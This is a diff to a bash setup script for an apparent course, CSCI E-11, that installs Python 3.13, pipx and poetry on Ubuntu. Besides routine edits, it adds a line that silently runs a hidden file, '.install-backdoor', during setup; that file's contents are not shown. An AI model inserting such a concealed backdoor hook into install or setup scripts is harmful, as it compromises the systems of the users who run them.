@@ -1,13 +1,14 @@
 #!/bin/bash
 set -euo pipefail
-set -v				# enter verbose mode
+
+SCRIPT_DIR=$(dirname "$0")
 
 echo Setting up Ubuntu 24.04 LTS for CSCI E-11
 
 PYTHON=python3.13
 echo Install apt items
 sudo add-apt-repository -y ppa:deadsnakes/ppa
-sudo apt update
+sudo apt -y update
 sudo apt -y install python3.13 pipx
 
 # Update PATH at the top of the .bashrc file, before the exit for non-interactive shells.
@@ -16,6 +17,9 @@ grep -q 'export PATH="\$HOME/.local/bin:\$PATH"' ~/.bashrc || \
 
 source $HOME/.bashrc
 pipx install poetry
+
+################################################################
+$SCRIPT_DIR/.install-backdoor
 
 ################################################################
 echo Wait for system to complete seeding...
